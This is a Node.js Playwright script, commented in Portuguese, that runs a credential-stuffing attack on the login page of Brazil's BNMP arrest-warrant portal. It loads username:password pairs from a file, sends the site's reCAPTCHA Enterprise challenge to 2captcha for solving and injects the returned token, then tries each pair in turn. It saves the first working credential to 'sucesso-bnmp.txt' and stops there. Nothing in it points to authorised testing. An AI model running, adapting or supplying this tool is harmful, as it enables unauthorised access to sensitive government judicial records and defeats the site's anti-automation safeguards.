import { chromium } from 'playwright';
import { readFile, appendFile } from 'node:fs/promises';

const LOGIN_URL = 'https://portalbnmp.cnj.jus.br/#/login';
const credentialsFile = process.env.BNMP_CREDENTIALS_FILE || 'credenciais-bnmp.txt';
const headless = process.env.HEADLESS === 'true';
const TWO_CAPTCHA_KEY = process.env.TWO_CAPTCHA_API_KEY;

async function carregarCredenciais() {
  const conteudo = await readFile(credentialsFile, 'utf8').catch(() => null);
  if (!conteudo) return [];
  return conteudo
    .split(/\r?\n/)
    .map((linha) => linha.trim())
    .filter((linha) => linha && !linha.startsWith('#') && linha.includes(':'))
    .map((linha) => {
      const separador = linha.indexOf(':');
      const usuario = linha.slice(0, separador).trim();
      const senha = linha.slice(separador + 1).trim();
      return { usuario, senha };
    })
    .filter(({ usuario, senha }) => usuario && senha && /\d/.test(usuario) && usuario.length > 2);
}

async function resolverCaptcha(page) {
  if (!TWO_CAPTCHA_KEY || TWO_CAPTCHA_KEY.includes('seu_')) {
    console.log('[!] Chave 2captcha nao configurada.');
    return false;
  }

  try {
    const sitekey = await page.evaluate(() => {
        const find = () => {
            if (window.___grecaptcha_cfg?.clients) {
                for (const cid in window.___grecaptcha_cfg.clients) {
                    const c = window.___grecaptcha_cfg.clients[cid];
                    for (const k in c) if (c[k]?.sitekey) return c[k].sitekey;
                }
            }
            const el = document.querySelector('[data-sitekey]');
            if (el) return el.getAttribute('data-sitekey');
            const iframe = document.querySelector('iframe[src*="recaptcha"]');
            if (iframe) return new URL(iframe.src).searchParams.get('k');
            return null;
        };
        return find();
    });

    if (!sitekey) return false;

    console.log(`[+] Resolvendo reCAPTCHA Enterprise (${sitekey})...`);
    const formData = new URLSearchParams();
    formData.append('key', TWO_CAPTCHA_KEY);
    formData.append('method', 'userrecaptcha');
    formData.append('googlekey', sitekey);
    formData.append('pageurl', page.url());
    formData.append('enterprise', '1');
    formData.append('json', '1');

    const res = await fetch('https://2captcha.com/in.php', { method: 'POST', body: formData });
    const data = await res.json();
    if (data.status !== 1) return false;

    const requestId = data.request;
    for (let i = 0; i < 60; i++) {
      await new Promise(r => setTimeout(r, 5000));
      const resOut = await fetch(`https://2captcha.com/res.php?key=${TWO_CAPTCHA_KEY}&action=get&id=${requestId}&json=1`);
      const dataOut = await resOut.json();
      if (dataOut.status === 1) {
        const token = dataOut.request;
        console.log('[+] Solucao recebida! Injetando...');
        
        await page.evaluate((t) => {
          const inputs = document.querySelectorAll('[name="g-recaptcha-response"], #g-recaptcha-response, .g-recaptcha-response');
          inputs.forEach(el => { el.value = t; el.innerHTML = t; el.dispatchEvent(new Event('change', { bubbles: true })); });
          
          if (window.___grecaptcha_cfg?.clients) {
            const findAndCall = (obj, seen = new Set()) => {
              if (!obj || typeof obj !== 'object' || seen.has(obj)) return;
              seen.add(obj);
              for (const k in obj) {
                if (k === 'callback' && typeof obj[k] === 'function') {
                    try { obj[k](t); } catch(e) {}
                } else findAndCall(obj[k], seen);
              }
            };
            for (const cid in window.___grecaptcha_cfg.clients) findAndCall(window.___grecaptcha_cfg.clients[cid]);
          }
        }, token);
        
        return true;
      }
      if (dataOut.request !== 'CAPCHA_NOT_READY') break;
    }
    return false;
  } catch (e) { return false; }
}

async function main() {
  const credenciais = await carregarCredenciais();
  const browser = await chromium.launch({ headless });

  for (let i = 0; i < credenciais.length; i++) {
    const { usuario, senha } = credenciais[i];
    console.log(`\n[${i + 1}/${credenciais.length}] Testando: ${usuario}`);
    
    const context = await browser.newContext({ viewport: { width: 1366, height: 900 } });
    const page = await context.newPage();

    try {
      await page.goto(LOGIN_URL, { waitUntil: 'networkidle', timeout: 60000 });
      let captchaResolvido = false;

      for (let attempt = 0; attempt < 12; attempt++) {
        await page.waitForTimeout(3000);
        const url = page.url();
        
        // 1. Detecta Captcha
        const hasCaptcha = url.includes('/captcha') || await page.locator('iframe[src*="recaptcha"]').isVisible().catch(() => false);
        if (hasCaptcha) {
          if (!captchaResolvido) {
            const ok = await resolverCaptcha(page);
            if (ok) {
                captchaResolvido = true;
                await page.waitForTimeout(5000);
            } else { break; }
          } else {
            console.log('[*] Captcha ja resolvido, forçando ida para login...');
            await page.evaluate(() => window.location.hash = '#/login');
          }
          continue;
        }

        // 2. Se caiu em pesquisa-peca, FORÇA LOGIN
        if (url.includes('pesquisa-peca')) {
            console.log('[*] Na pagina de pesquisa. Forçando #/login...');
            await page.evaluate(() => window.location.hash = '#/login');
            await page.waitForTimeout(2000);
            continue;
        }

        // 3. Verifica se estamos na página de Login (Campos visíveis)
        const uField = page.locator('#username, input[type="text"]:visible, input[name*="user"]').first();
        if (await uField.isVisible({ timeout: 5000 }).catch(() => false)) {
          console.log('[+] Formulario pronto. Preenchendo...');
          const pField = page.locator('#password, input[type="password"]:visible').first();
          const sBtn = page.locator('#kc-login, button[type="submit"], button:has-text("Entrar")').first();

          await uField.click(); await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
          await uField.type(usuario, { delay: 20 });
          await pField.click(); await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
          await pField.type(senha, { delay: 20 });
          await sBtn.click({ force: true });
          console.log('[*] Tentativa enviada.');

          const resErro = [
            '.alert-danger', '.error-message', '.msg-erro', '#input-error-firstname', 
            '.alert-warning', '.kc-feedback-text', '.pf-c-alert',
            'text=/inválido/i', 'text=/inválidas/i', 'text=/conferem/i', 'text=/incorreto/i'
          ].join(', ');
          
          const resSucesso = ['text=/Sair/i', 'text=/Log out/i', 'text=/Meu Perfil/i', '.navbar-user', 'text=/Página Inicial/i'].join(', ');

          await Promise.race([
            page.waitForURL(u => !u.includes('login') && !u.includes('auth') && !u.includes('authenticate'), { timeout: 15000 }),
            page.waitForSelector(resErro, { timeout: 10000 }),
            page.waitForSelector(resSucesso, { timeout: 15000 })
          ]).catch(() => {});

          const urlF = page.url();
          const errEl = page.locator(resErro).first();
          const okEl = page.locator(resSucesso).first();
          
          const temErro = await errEl.isVisible().catch(() => false);
          const temSucesso = await okEl.isVisible().catch(() => false);

          // Checagem extra de texto direto na página se estiver no SSO
          const textoPagina = urlF.includes('auth') ? await page.innerText('body').catch(() => '') : '';
          const encontrouErroTexto = /Usuário ou senha inválido|Credenciais inválidas/i.test(textoPagina);

          if (temSucesso || (!urlF.includes('login') && !urlF.includes('auth') && !urlF.includes('authenticate') && !temErro && !encontrouErroTexto)) {
            console.log(`\n[!!!] SUCESSO: ${usuario}:${senha}`);
            await appendFile('sucesso-bnmp.txt', `${usuario}:${senha}\n`);
            process.exit(0);
          } else if (temErro || encontrouErroTexto) {
            let msg = 'Credencial invalida';
            if (temErro) msg = await errEl.innerText().catch(() => msg);
            else if (encontrouErroTexto) msg = 'Usuário ou senha inválido (detectado via texto)';
            
            console.log(`[-] Falhou: ${msg.trim().split('\n')[0]} (${usuario})`);
            break; // Sai do loop de tentativas para testar o próximo usuário
          } else {
            console.log(`[-] Resultado incerto em ${urlF}.`);
            if (urlF.includes('auth') || urlF.includes('login') || urlF.includes('authenticate')) {
                // Se parou aqui sem erro nem sucesso, pode ser timeout ou bloqueio.
                // Mas se o botão sumiu, provavelmente deu erro.
                const sBtnAindaExiste = await sBtn.isVisible().catch(() => false);
                if (!sBtnAindaExiste) {
                    console.log('[-] Botao sumiu sem mensagem clara. Pulando.');
                    break;
                }
                continue; // Tenta de novo se o botão ainda estiver lá
            }
            break;
          }
        } else {
          // Tenta clicar no botão Login que costuma estar no topo
          const loginBtn = page.locator('a').filter({ hasText: /Login/i }).first();
          if (await loginBtn.isVisible().catch(() => false)) {
              await loginBtn.click();
          } else if (url.includes('portalbnmp')) {
              await page.evaluate(() => window.location.hash = '#/login');
          }
        }
      }
    } catch (e) { console.error(`[-] Erro: ${e.message}`); }
    finally { await context.close(); }
  }
  await browser.close();
}
main().catch(console.error);
